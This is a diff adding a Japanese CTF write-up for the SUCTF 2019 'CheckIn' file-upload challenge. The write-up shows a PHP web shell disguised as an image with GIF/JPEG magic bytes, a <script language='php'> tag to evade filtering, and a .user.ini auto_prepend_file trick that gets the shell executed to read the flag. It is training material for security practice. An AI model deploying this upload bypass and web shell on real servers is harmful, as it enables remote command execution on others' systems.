@@ -19,6 +19,7 @@
 - [[极客大挑战 2019]PHP](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php)
 - [[ACTF2020 新生赛]Exec](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec)
 - [[极客大挑战 2019]Http](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http)
+- [[SUCTF 2019]CheckIn](#suctf-2019checkin)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -771,3 +772,83 @@ It doesn't come from 'https://www.Sycsecret.com'
 ```
 flag{784392dc-e1db-411a-b5a6-989fc4a2c0d9}
 
+# [SUCTF 2019]CheckIn
+
+upload問題なのでとりあえず、jpgファイルと偽装させたphpファイルをアップロードする。
+次のようにshell.jpgを定義し
+```php
+<?php os.system($_GET['cmd']);?>
+```
+ファイルの先頭に画像のマジックナンバーを挿入することで画像ファイルであると認識させる。
+```
+$ echo "FFD8FFE0" | xxd -r -p > test.jpg
+$ cat shell.jpg >> test.jpg
+$ file test.jpg 
+test.jpg: JPEG image data
+```
+
+しかし、当然これでは
+```
+<? in contents!
+```
+といわれ怒られます。
+
+burpを挟んでファイルの情報を書き換えてもサーバ側で確認されてるの意味がないようです。いろいろ調べていると、サーバ側のphpの設定ファイルを書き換えることでこれをbypassできそうだということがわかりました。
+
+php.iniとは
+> 設定ファイル (php.ini) は PHP の起動時に読み込まれます。 PHP のサーバーモジュール版では、Web サーバーの起動時に 一度だけ読み込まれます。CGI 版と CLI 版では、スクリプトが呼び出される度に読み込まれます。
+
+> php.ini設定には、auto_prepend_fileとauto_append_fileという設定があります。こちらの設定は、PHPスクリプトの実行前と実行後に自動インクルードファイルです。
+
+auto-prepend-fileとは
+> メインファイルの実行前に呼び出されるファイルを設定します。
+php.ini、.httaccessに設定すれば使用することが可能です。
+
+auto_append_fileとは
+> メインファイルの実行後に呼び出されるファイルを設定します。
+php.ini、.httaccessに設定すれば使用することが可能です。
+
+.user.iniとは
+> PHP 5.3.0 以降、PHP はディレクトリ単位での INI ファイルをサポートするようになりました。 このファイルは、CGI/FastCGI SAPI の場合にのみ処理されます。 この機能は、PECL htscanner 拡張モジュールを置き換えるものです。 Apache モジュールとして PHP を実行している場合は .htaccess ファイルを使えば同じ機能を実現できます。
+> PHP の設定は、php.ini で行います。Apache の環境では、.htaccess ファイルを使用して、仮想ディレクトリごとに php.ini の設定を上書きすることができます。IIS で PHP を利用する場合、これまで php.ini の設定を上書きする標準的な方法は存在しなかったため、Web サーバーごとに1つの設定しか利用できませんでした。PHP 5.3.0 以降では、php.ini に新機能が追加され、IIS 環境でサイトや仮想ディレクトリごとに php.ini の設定を上書きできるようになりました。詳しくは、「PHP: INI ファイルの扱いに関する変更」
+
+```
+php.ini の設定を上書きする方法は2つあります。1つは、.user.ini ファイルを使用する方法です。.user.ini を使用するには、php.ini ファイルに追加された新しいディレクティブ user_ini_.filename と user_ini.cache_ttl を使用します。一例として、アップロード可能なファイルサイズの上限値である upload_max_filesize（既定値は 2MB）の設定値を仮想ディレクトリごとに変更してみましょう。まず、PHP のバイナリをインストールしたフォルダーにある php.ini ファイルを編集して、次の2つのディレクティブを設定します。
+
+--- C:\Program Files(x86)\PHP\php.ini ---
+user_ini_.filename = ".user.ini"
+user_ini.cache_ttl = 300
+-----------------------------------------
+
+　次に、設定を上書きしたい仮想ディレクトリのフォルダー内に .user.ini ファイルを作成し、次のように上書きする設定を行います。
+```
+
+つまり、phpファイルをアップロードしてphpを実行させることはできない??のでphpの設定ファイルを書き換えて、index.phpを実行させる前に事前にアップロードした画像に偽装させたphpファイルを実行させる。\\
+そこで.user.iniを利用してphp.iniを上書きする。
+
+また、<?php ?>が使えないので、<script language=“php”></scrip>を利用する
+
+> PHP 5 では、PHP の cnfigure 方法に応じて最大で五種類の開始タグ・終了タグが使えます。 そのうちの二つである <?php ?> と <script language="php"> </script> は、常に使えます。 また、短い形式の echo タグ <?= ?> も、 PHP 5.4.0 以降では常に使えます。
+
+```
+$ cat .user.ini                                                             
+GIF89a
+auto_prepend_file=shell.jpgk
+```
+```
+$ cat shell.jpg 
+GIF89a
+<script language="php">echo system($_GET['cmd']);</script>
+```
+
+```
+Your dir uploads/04b0951938d905b41348c1548f9c338b 
+Your files : 
+array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".user.ini" [3]=> string(9) "index.php" [4]=> string(9) "shell.jpg" } 
+```
+
+## /uploads/04b0951938d905b41348c1548f9c338b/index.php?cmd=cat%20/flag
+
+```
+GIF89a flag{8f5ae8cd-f210-4514-980d-f0eaedf4f7f3} flag{8f5ae8cd-f210-4514-980d-f0eaedf4f7f3}
+```
